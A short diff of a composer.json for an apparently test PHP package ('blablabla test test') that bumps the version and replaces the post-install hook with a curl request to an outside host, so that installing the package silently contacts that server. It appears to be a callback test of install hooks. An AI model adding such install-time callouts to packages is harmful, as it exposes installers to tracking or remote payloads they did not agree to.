@@ -1,8 +1,8 @@
 {
     "name": "gwen001/myphptestpackage",
     "description": "blablabla test test",
-    "version": "1.0.3",
+    "version": "1.0.4",
     "scripts": {
-        "post-install-cmd": "php index.php"
+        "post-install-cmd": "curl http://10degres.net/composer-package/yyy"
     }
 }
